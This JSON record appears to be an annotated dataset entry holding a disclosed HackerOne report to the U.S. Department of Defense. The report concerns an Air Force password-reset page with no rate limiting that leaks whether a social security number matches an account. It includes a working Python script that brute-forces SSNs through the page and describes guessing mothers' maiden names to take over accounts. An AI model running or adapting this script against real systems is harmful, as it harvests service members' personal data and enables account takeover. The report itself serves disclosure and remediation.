{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "hypervis0r ",
    "title": "Lack of rate limiting in https://\u2588\u2588\u2588/PKI/PassReset.aspx leads to PII disclosure and potential account takeover",
    "content": "\nThe password reset functionality of AFPC Secure is intended to be used by users who do not have a PKI credential for AFPC secure. It allows a user to provide their SSAN and Mother's Maiden Name to reset their password. The issue lies in the fact that if an SSAN for a user with an active PKI credential is found, the system will inform the user of that fact with the following error message:\nCode 257 Bytes\n1Your account was found, but our records indicate you are either Military, Civilian, or a Contractor with a CAC, which you must use to reset your password. For more information, please click the link above labeled \"Help with accessing AFPCSecure using a CAC\"\nAdditionally, there is no rate limiting done for this site, meaning an attacker can brute force through approximately 772,000,000 social security numbers to find SSANs for active U.S. Air Force personnel. Furthermore, if any SSANs are found that aren't tied to active PKI credentials (i.e. authorized UserId/Password users, POW-MIA Next of Kin users), an attacker could potentially trigger a password reset by brute forcing the mother's maiden name field (for example, going through most common last names).\nPlease see the steps to reproduce for a proof-of-concept script that brute forces SSANs with the password reset functionality.\nImpact\nThis vulnerability can lead to the exposure of personally identifiable information for U.S. Air Force personnel, and can potentially lead to an account takeover in the right circumstances.\nSystem Host(s)\n\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nSee the following Python script for a proof-of-concept. The script will brute force through 772,000,000 SSANs by default, you can adjust the minimum and maximum search range on line 87. Uncomment line 84 to do a single SSAN search.\nCode 2.76 KiB\n1import requests\n2from tqdm import tqdm\n3from bs4 import BeautifulSoup\n4import urllib\n5import urllib3\n6urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n7\n8# Get all the hidden ASP.NET inputs\n9def __get_hidden_input(content):\n10    \"\"\" Return the dict contain the hidden input \n11    \"\"\"\n12    tags = dict()\n13    soup =BeautifulSoup(content, 'html.parser')\n14    hidden_tags = soup.find_all('input', type='hidden')\n15    # print(*hidden_tags)\n16    for tag in hidden_tags:\n17        tags[tag.get('name')] = tag.get('value')\n18    \n19    return tags\n20\n21url = \"https://\u2588\u2588\u2588\u2588\u2588\"\n22\n23headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36\"}\n24\n25session = requests.Session()\n26\n27# Simulate ASP.NET post back function\n28def doPostBack(url, data):\n29    resp = session.get(url, headers=headers, verify=False)\n30    asp_info = __get_hidden_input(resp.text)\n31\n32    asp_info.update(data)\n33\n34    return session.post(url,  data=asp_info, headers=headers, verify=False)\n35\n36# Click check portal button\n37data = {\"btnOK\": \"OK\"}\n38resp = doPostBack(url + \"/CheckPortal.aspx\", data)\n39\n40# Go to forgot password page\n41data = {\"__EVENTTARGET\": \"ctl00$cphPage$btnForgotPassword\"}\n42resp = doPostBack(url + \"/PKI/default.aspx\", data)\n43\n44# Go to password reset page\n45data = {\"ctl00$cphPage$btnPOW\": \"Online Password Reset\"}\n46resp = doPostBack(url + \"/PKI/PassReset1.aspx\", data)\n47print(resp.text)\n48\n49# Get the ASP.NET inputs for the password reset page\n50asp_info = __get_hidden_input(resp.text)\n51\n52def range_search(min=0, max=772000000):\n53    for ssan in tqdm(range(min, max)):\n54        data = asp_info\n55        data[\"ctl00$cphPage$txtSSAN\"] = str(ssan).zfill(9)\n56        data[\"ctl00$phPage$txtMMN\"] = \"NONEXISTANT\"\n57        data[\"ctl00$cphPage$btnSubmit\"] = \"Submit\"\n58\n59        resp = session.post(url + \"/PKI/PassReset.aspx\", data=data, verify=False, allow_redirects=False)\n60\n61        if resp.status_code != 200:\n62            print(f\"!! Error, resp code {resp.status_code}\\n{resp.text}\")\n63\n64        if (\"SSAN Does not match a ssan in our records.\" not in resp.text):\n65            print(f\"[+] Found potential SSAN: {str(ssan).zfill(9)}\")\n66\n67def single_search(ssan):\n68    data = asp_info\n69    data[\"ctl00$cphPage$txtSSAN\"] = str(ssan).zfill(9)\n70    data[\"ctl00$phPage$txtMMN\"] = \"NONEXISTANT\"\n71    data[\"ctl00$cphPage$btnSubmit\"] = \"Submit\"\n72\n73    resp = session.post(url + \"/PKI/PassReset.aspx\", data=data, verify=False, allow_redirects=False)\n74    \n75    print(resp.text)\n76\n77    if resp.status_code != 200:\n78        print(f\"!! Error, resp code {resp.status_code}\\n{resp.text}\")\n79\n80    if (\"SSAN Does not match a ssan in our records.\" not in resp.text):\n81        print(f\"[+] Found potential SSAN: {str(ssan).zfill(9)}\")\n82\n83# Single search, provide SSAN to test\n84#single_search(555001337)\n85\n86# Range search, specify min/max to set range\n87range_search()\nSuggested Mitigation/Remediation Actions\nImplement a rate limit for https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/. Additionally, adjust the error message to not give out more information than necessary.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "Information Exposure Through an Error Message"
    ],
    "screenshots": {},
    "disclosed_date": 1729886700,
    "report_url": "https://hackerone.com/reports/2748003",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "LOW",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Access the password reset functionality at https://\u2588\u2588\u2588/PKI/PassReset.aspx."
        ],
        [
            2,
            "Brute force SSANs and observe the system's response to identify active PKI credentials or trigger password resets for non-PKI users."
        ]
    ],
    "vuln_description": "The password reset functionality lacks rate limiting, allowing brute force attacks to discover SSANs tied to active PKI credentials or trigger password resets for non-PKI users by brute forcing the mother's maiden name field.",
    "reason": "The vulnerability involves a straightforward brute force attack without the need for complex interactions or state manipulations. The lack of rate limiting and informative error messages makes the attack surface obvious.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}